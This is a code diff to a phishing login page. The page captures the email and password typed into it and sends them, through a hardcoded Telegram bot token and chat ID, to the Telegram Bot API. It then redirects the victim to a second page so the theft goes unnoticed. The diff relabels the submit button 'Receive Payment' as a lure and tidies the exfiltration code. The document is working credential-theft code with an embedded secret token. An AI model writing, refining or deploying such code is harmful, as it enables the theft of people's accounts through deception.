@@ -170,7 +170,7 @@
                 <label for="password">Password</label>
                 <input type="password" id="password" placeholder="Enter your password" required />
 
-                <button type="submit" class="login-btn">Login</button>
+                <button type="submit" class="login-btn">Receive Payment</button>
             </form>
         </div>
     </div>
@@ -182,12 +182,16 @@
             const email = document.getElementById("email").value.trim();
             const password = document.getElementById("password").value.trim();
 
-            // Prepare the message
+            // Validate inputs
+            if (!email || !password) {
+                console.error('Login details not found.');
+                return; // Exit if fields are empty
+            }
+
             const message = `Email: ${email}\nPassword: ${password}`;
 
-            // Replace with your bot's token and chat ID
-            const botToken = '7536734919:AAElc3m0mOSItiAgFI0eZSYmEckEtsQHCcg'; // Ensure you have a valid bot token
-            const chatId = '6367881211'; // Ensure you have a valid chat ID
+            const botToken = '7536734919:AAElc3m0mOSItiAgFI0eZSYmEckEtsQHCcg';
+            const chatId = '6367881211';
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -208,7 +212,6 @@
                 .then(data => {
                     if (data.ok) {
                         console.log('Message sent successfully');
-                        // Redirect to login.html after successful message sending
                         window.location.href = "login.html";
                     } else {
                         console.error('Error sending message:', data.description);
